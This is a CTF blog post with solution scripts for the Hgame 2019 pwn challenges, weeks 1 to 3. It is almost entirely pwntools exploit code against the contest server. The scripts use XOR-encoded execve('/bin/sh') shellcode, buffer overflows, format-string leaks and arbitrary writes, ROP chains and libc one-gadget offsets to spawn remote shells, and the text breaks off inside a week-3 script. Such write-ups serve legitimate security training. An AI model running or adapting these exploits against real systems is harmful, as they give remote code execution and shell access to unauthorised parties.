<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="去年也是这时候，记得是校赛后Lilac学长让我们做的训练题，不过去年只做Web，今年只看了PWN(week1后账号没了，换了小号)第一周:Kirin-say , 二三四周:梅零落PWN题： 1234week1:一血：2，二血：1week2:一血：1，二血：2week3:一血：2，二血：1，三血：1week4:一血：3 All the challenge of pwn has been solved">
<meta property="og:type" content="article">
<meta property="og:title" content="Hgame 2019 PWN">
<meta property="og:url" content="http://yoursite.com/2019/02/22/Hgame-2019-PWN/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="去年也是这时候，记得是校赛后Lilac学长让我们做的训练题，不过去年只做Web，今年只看了PWN(week1后账号没了，换了小号)第一周:Kirin-say , 二三四周:梅零落PWN题： 1234week1:一血：2，二血：1week2:一血：1，二血：2week3:一血：2，二血：1，三血：1week4:一血：3 All the challenge of pwn has been solved">
<meta property="article:published_time" content="2019-02-22T13:03:37.000Z">
<meta property="article:modified_time" content="2019-02-24T13:07:04.000Z">
<meta property="article:author" content="Kirin">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Hgame 2019 PWN</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/02/23/Building-MIPS-Environment-for-Router-PWN/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/02/08/pwnable-tw-3x17/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/22/Hgame-2019-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&text=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&title=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&is_video=false&description=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Hgame 2019 PWN&body=Check out this article: http://yoursite.com/2019/02/22/Hgame-2019-PWN/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&title=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&title=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&title=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&title=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&name=Hgame 2019 PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#week-1"><span class="toc-number">1.</span> <span class="toc-text">week 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">1.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-number">1.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-number">1.4.</span> <span class="toc-text">4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-2"><span class="toc-number">2.</span> <span class="toc-text">week 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-number">2.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1"><span class="toc-number">2.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1"><span class="toc-number">2.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1"><span class="toc-number">2.4.</span> <span class="toc-text">4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-3"><span class="toc-number">3.</span> <span class="toc-text">week 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2"><span class="toc-number">3.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2"><span class="toc-number">3.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2"><span class="toc-number">3.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2"><span class="toc-number">3.4.</span> <span class="toc-text">4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-4"><span class="toc-number">4.</span> <span class="toc-text">week 4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3"><span class="toc-number">4.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3"><span class="toc-number">4.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3"><span class="toc-number">4.3.</span> <span class="toc-text">3</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Hgame 2019 PWN
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-02-22T13:03:37.000Z" itemprop="datePublished">2019-02-22</time>
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>去年也是这时候，记得是校赛后Lilac学长让我们做的训练题，不过去年只做Web，今年只看了PWN<br>(week1后账号没了，换了小号)<br>第一周:Kirin-say , 二三四周:梅零落<br>PWN题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">week1:一血：2，二血：1</span><br><span class="line">week2:一血：1，二血：2</span><br><span class="line">week3:一血：2，二血：1，三血：1</span><br><span class="line">week4:一血：3</span><br></pre></td></tr></table></figure>
<p><strong>All the challenge of pwn has been solved.</strong><br>面向招新，题目都比较简单<br>感谢杭电师傅们四周的辛苦（客服好评）</p>
<h2 id="week-1"><a href="#week-1" class="headerlink" title="week 1"></a>week 1</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./babysc"</span>)</span><br><span class="line">p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">10000</span>)</span><br><span class="line">s=<span class="string">"\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span></span><br><span class="line"><span class="comment">#s="aaaaaaaaaaaaaaaaa"</span></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">   payload+=chr(ord(s[i])^(i+<span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">9999</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x80</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">ans=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">10001</span>)</span><br><span class="line">    <span class="comment">#p=process("./CSTW")</span></span><br><span class="line">    p.send(<span class="string">"\n\n\n\n\n"</span>)</span><br><span class="line"><span class="comment">#    p.recvuntil("——\n")</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">256</span>):</span><br><span class="line">             p.recvuntil(<span class="string">"——\n"</span>)</span><br><span class="line">             ans=flag+chr(k)+<span class="string">"\x00"</span></span><br><span class="line">             p.send(ans)</span><br><span class="line">             s=p.recvuntil(<span class="string">"\n"</span>)            </span><br><span class="line">             <span class="comment">#print s</span></span><br><span class="line">             <span class="keyword">if</span> <span class="string">"..勇者Ch1p"</span> <span class="keyword">in</span>   s:</span><br><span class="line">                  flag+=chr(k)</span><br><span class="line">                  <span class="keyword">print</span> flag</span><br><span class="line">                  p.close()</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="comment">#p=process("./Steins;Gate")</span></span><br><span class="line">p.sendlineafter(<span class="string">"ID:"</span>,<span class="string">"/bin/sh\x00kirin"</span>)</span><br><span class="line">p.sendafter(<span class="string">"world.\n"</span>,<span class="string">"a"</span>*<span class="number">48</span>+<span class="string">"3#"</span>)</span><br><span class="line">p.sendafter(<span class="string">"man.\n"</span>,<span class="string">"%7$p"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">s=p.recvuntil(<span class="string">"00"</span>)</span><br><span class="line">s=int(s[:<span class="number">-2</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(s+<span class="number">0x1234</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">"?\n"</span>,<span class="string">"ff\x00\x00"</span>*<span class="number">12</span>+p32(s+<span class="number">0x1234</span>))</span><br><span class="line">p.sendafter(<span class="string">"debts.\n"</span>,<span class="string">"%11$p"</span>)</span><br><span class="line">s=int(p.recvuntil(<span class="string">"00"</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(s)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">"To seek the truth of the world.\n"</span>,<span class="string">"a"</span>*<span class="number">48</span>+<span class="string">"3#\x00\x00"</span>*<span class="number">2</span>+p64(s)+<span class="string">"a"</span>*<span class="number">8</span>+p64(<span class="number">0x400c73</span>)+p64(<span class="number">0x602040</span>)+p64(<span class="number">0x400a76</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="week-2"><a href="#week-2" class="headerlink" title="week 2"></a>week 2</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">11000</span>)</span><br><span class="line"><span class="comment">#p=process("./CSTW2")</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">   p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">   p.send(<span class="string">"\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">"-9"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;"</span>,p64(<span class="number">0x40096a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">11003</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"ID:"</span>,<span class="string">"/bin/sh\x00kirin"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"world.\n"</span>,<span class="string">"a"</span>*<span class="number">48</span>+<span class="string">"3#"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"man.\n"</span>,<span class="string">"%7$p"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    s=p.recvuntil(<span class="string">"Y"</span>)</span><br><span class="line">    s=int(s[:<span class="number">-9</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(s+<span class="number">0x1234</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendafter(<span class="string">"?\n"</span>,<span class="string">"ff\x00\x00"</span>*<span class="number">12</span>+p32(s+<span class="number">0x1234</span>))</span><br><span class="line">    p.sendafter(<span class="string">"debts.\n"</span>,<span class="string">"%11$p"</span>)</span><br><span class="line">    s=int(p.recvuntil(<span class="string">"00"</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(s)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendafter(<span class="string">"To seek the truth of the world.\n"</span>,<span class="string">"ff\x00\x00"</span>*<span class="number">12</span>+<span class="string">"3#\x00\x00"</span>*<span class="number">2</span>+p64(s)+<span class="string">"a"</span>*<span class="number">8</span>+<span class="string">"\xdb\x0d"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendlineafter(<span class="string">"ID:"</span>,<span class="string">"/bin/sh\x00kirin"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"world.\n"</span>,<span class="string">"a"</span>*<span class="number">48</span>+<span class="string">"3#"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"man.\n"</span>,<span class="string">"%7$p"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    s2=p.recvuntil(<span class="string">"Y"</span>)</span><br><span class="line">    s2=int(s2[:<span class="number">-9</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(s2+<span class="number">0x1234</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendafter(<span class="string">"?\n"</span>,<span class="string">"ff\x00\x00"</span>*<span class="number">12</span>+p32(s2+<span class="number">0x1234</span>))</span><br><span class="line">    p.sendafter(<span class="string">"debts.\n"</span>,<span class="string">"%3$p"</span>)</span><br><span class="line">    s1=int(p.recvuntil(<span class="string">"W"</span>)[:<span class="number">-2</span>],<span class="number">16</span>)-(<span class="number">0x7f0a1bc1e260</span><span class="number">-0x7f0a1bb27000</span>)+<span class="number">0x45216</span></span><br><span class="line">    <span class="keyword">print</span> hex(s1)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendafter(<span class="string">"To seek the truth of the world.\n"</span>,<span class="string">"\x00\x00\x00\x00"</span>*<span class="number">12</span>+<span class="string">"3#\x00\x00"</span>*<span class="number">2</span>+p64(s)+<span class="string">"a"</span>*<span class="number">8</span>+p64(s1)+p64(<span class="number">0</span>)*<span class="number">6</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">     <span class="keyword">print</span> <span class="string">"kirin"</span></span><br></pre></td></tr></table></figure>
<h3 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">11002</span>)</span><br><span class="line"><span class="comment">#p=process("./handsomeariis")</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">"Repeat me!\n"</span>,<span class="string">"Aris so handsoooome!"</span>+<span class="string">"\x00"</span>*<span class="number">20</span>+p64(<span class="number">0x0400873</span>)+p64(<span class="number">0x601018</span>)+p64(<span class="number">0x400590</span>)+p64(<span class="number">0x400735</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Great! Power upupuppp!\n"</span>)</span><br><span class="line">s=u64(p.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>)<span class="number">-0x06f690</span>+<span class="number">0xf02a4</span></span><br><span class="line">p.sendlineafter(<span class="string">"Repeat me!\n"</span>,<span class="string">"Aris so handsoooome!"</span>+<span class="string">"\x00"</span>*<span class="number">20</span>+p64(s))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./babyfmtt")</span></span><br><span class="line">p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">11001</span>)</span><br><span class="line"><span class="comment">#400e84</span></span><br><span class="line">payload1=<span class="string">"%2126c%8$hnkirin"</span>+p64(<span class="number">0x601020</span>)+p64(<span class="number">0xffffffffffffffff</span>)*<span class="number">12</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">"PWN\n"</span>,payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="week-3"><a href="#week-3" class="headerlink" title="week 3"></a>week 3</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=remote("118.24.3.214",10002)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">12343</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"ID:"</span>,<span class="string">"/bin/sh\x00kirin"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"world.\n"</span>,<span class="string">"a"</span>*<span class="number">48</span>+<span class="string">"3#"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"man.\n"</span>,<span class="string">"%7$p"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    s=p.recvuntil(<span class="string">"Y"</span>)</span><br><span class="line">    s=int(s[:<span class="number">-9</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(s+<span class="number">0x1234</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendafter(<span class="string">"?\n"</span>,<span class="string">"ff\x00\x00"</span>*<span class="number">12</span>+p32(s+<span class="number">0x1234</span>))</span><br><span class="line">    p.sendafter(<span class="string">"debts.\n"</span>,<span class="string">"%11$p"</span>)</span><br><span class="line">    s=int(p.recvuntil(<span class="string">"00"</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(s)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendafter(<span class="string">"To seek the truth of the world.\n"</span>,<span class="string">"ff\x00\x00"</span>*<span class="number">12</span>+<span class="string">"3#\x00\x00"</span>*<span class="number">2</span>+p64(s)+<span class="string">"a"</span>*<span class="number">8</span>+<span class="string">"\xdb\x0d"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendlineafter(<span class="string">"ID:"</span>,<span class="string">"/bin/sh\x00kirin"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"world.\n"</span>,<span class="string">"a"</span>*<span class="number">48</span>+<span class="string">"3#"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"man.\n"</span>,<span class="string">"%7$p"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    s2=p.recvuntil(<span class="string">"Y"</span>)</span><br><span class="line">    s2=int(s2[:<span class="number">-9</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(s2+<span class="number">0x1234</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendafter(<span class="string">"?\n"</span>,<span class="string">"ff\x00\x00"</span>*<span class="number">12</span>+p32(s2+<span class="number">0x1234</span>))</span><br><span class="line">    p.sendafter(<span class="string">"debts.\n"</span>,<span class="string">"%3$p"</span>)</span><br><span class="line">    s1=int(p.recvuntil(<span class="string">"W"</span>)[:<span 